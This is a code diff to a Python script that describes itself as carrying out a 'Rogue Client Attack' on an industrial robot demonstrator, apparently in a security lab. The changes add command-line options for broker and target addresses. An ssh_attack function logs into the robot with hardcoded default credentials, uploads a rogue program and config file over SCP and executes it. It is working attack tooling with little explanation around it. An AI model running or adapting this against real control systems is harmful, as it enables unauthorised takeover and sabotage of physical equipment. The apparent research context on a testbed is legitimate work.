@@ -1,3 +1,4 @@
+import os
 from datetime import datetime, timezone
 import json
 import re
@@ -6,11 +7,30 @@ import asyncio
 import aiomqtt
 import globs
 import sqlite3
-import time
 from paramiko import SSHClient
 from paramiko.client import AutoAddPolicy
 from scp import SCPClient
 import random
+import argparse
+import sys
+
+# Include Argparse for easy execution via shell
+parser = argparse.ArgumentParser(prog="sniff_mqtt", description= "Script to directly carry out the Rogue Client Attack.",\
+    usage=f"python3 {sys.argv[0]} [OPTIONS]", epilog="Enjoy! :)")
+
+parser.add_argument("--broker_ip", "-b", type=str, required=False, default="192.168.0.10", metavar="IP_ADDRESS", help="broker IP address to connect to")
+parser.add_argument("--broker_port", "-p", type=str, required=False, default=1883, metavar="PORT", help="broker port to connect to, default is 1883")
+parser.add_argument("--vgr_ip", "-vi", type=str, required=False, default="192.168.0.13", metavar="IP_ADDRESS", help="VGR IP address to connect to via SSH")
+parser.add_argument("--vgr_port", "-vp", type=str, required=False, default="22", metavar="IP_ADDRESS", help="VGR port address to connect to via SSH")
+parser.add_argument("--dbfile", "-db", type=str, required=False, default=f"{os.getcwd()}/fl_mqtt.sqlite", metavar="FILE_PATH", help="file path to database contain mqtt information")
+
+
+args = parser.parse_args()
+IP_ADDRESS = args.broker_ip
+PORT = args.broker_port
+VGR_IP = args.vgr_ip
+VGR_PORT = args.vgr_port
+SQL_DB_PATH = args.dbfile
 
 
 # # change event loop policy given a Windows machine. ref: https://sbtinstruments.github.io/aiomqtt/index.html#note-for-windows-users
@@ -22,9 +42,6 @@ logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=lo
 # suppress needless logging info from imported modules
 logging.getLogger("paramiko").setLevel(logging.WARNING)
 logging.getLogger("asyncio").setLevel(logging.WARNING)
-
-IP_ADDRESS = '192.168.0.10'
-PORT = 1883
 
 
 def state(active, code, description="", station="vgr", target=None):
@@ -67,7 +84,7 @@ def retrieve_from_stock(color: str, stock: str) -> str:
 
 
 def retrieve_from_db(table_name):
-    conn = sqlite3.connect("fl_mqtt.sqlite")
+    conn = sqlite3.connect(SQL_DB_PATH)
     cursor = conn.cursor()
 
     cursor.execute(f"""SELECT time_delta_from_previous, mqtt_qos, mqtt_topic, mqtt_payload FROM {table_name}""")
@@ -89,8 +106,8 @@ async def ssh_attack():
     logging.getLogger("paramiko").setLevel(logging.WARNING)
 
     logger.info("Starting file upload attack on target VGR")
-    server = '192.168.0.13'
-    port = 22
+    server = VGR_IP
+    port = VGR_PORT
     username = password = 'ROBOPro'
 
     # create ssh object and connect
@@ -101,11 +118,10 @@ async def ssh_attack():
 
     # hijack the established tcp/ssh connection and copy files
     scp = SCPClient(ssh.get_transport())
-    path = '/home/kali/fischer/vgr/C-Program/'
+    path = os.getcwd()
     # now copy the rogue program
-    scp.put(f'{path}TxtParkPosVGR', '.')
-    path2 = '/home/kali/fischer/vgr/Data/Config.ParkPos.json'
-    scp.put(f'{path2}', 'Data/')
+    scp.put(f'{os.getcwd()}/TxtParkPosVGR', '.')
+    scp.put(f'{os.getcwd()}/Config.ParkPos.json', 'Data/')
 
     # now run the rogue program
     ssh.exec_command('./TxtParkPosVGR')
